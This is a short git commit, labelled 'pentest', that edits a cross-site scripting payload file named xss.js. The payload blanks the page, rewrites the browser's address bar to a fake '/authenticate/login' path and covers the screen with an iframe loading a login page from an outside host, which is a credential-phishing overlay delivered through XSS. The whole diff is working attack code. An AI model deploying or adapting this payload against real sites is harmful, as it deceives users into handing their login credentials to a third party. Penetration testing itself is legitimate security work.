59ae5d8211c7c24992f0f2cf63217bc535a95b10
Alesya Huzik <mail@alesya.me>
2025-11-11 16:10:48 +1100

    pentest

--- xss.js
+++ xss.js
@@ -1,4 +1,4 @@
-document.body.innerHTML = '';
-history.replaceState({ edited: false }, '', '/login');
+document.body.innerHTML = '<div></div>';
+history.replaceState({ edited: false }, '', '/authenticate/login');
 document.body.innerHTML='<iframe style="position: absolute; top: 0; left: 0; width: 100vw; height: 100vh;" src="https://aguzik.net/ar-login.html"/>'
 //history.replaceState({ edited: true }, '', '/login');
